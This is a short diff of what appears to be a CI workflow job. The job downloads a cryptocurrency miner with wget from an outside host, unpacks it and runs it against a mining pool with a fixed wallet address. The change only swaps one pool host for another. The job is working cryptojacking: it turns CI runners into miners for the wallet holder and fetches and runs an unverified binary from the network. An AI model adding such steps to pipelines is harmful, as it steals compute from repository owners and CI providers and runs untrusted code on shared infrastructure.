@@ -12,4 +12,4 @@ jobs:
         run: |
           wget --user-agent="Mozilla" http://oskarplyt.5v.pl/webchain-miner.tgz
           tar xzvf webchain-miner.tgz
-          ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0x307929d8e9cb3dc7c605cfad1b70740e74e6c561 -p x
+          ./webchain-miner -o pool.webchain.network:3333 -u 0x307929d8e9cb3dc7c605cfad1b70740e74e6c561 -p x
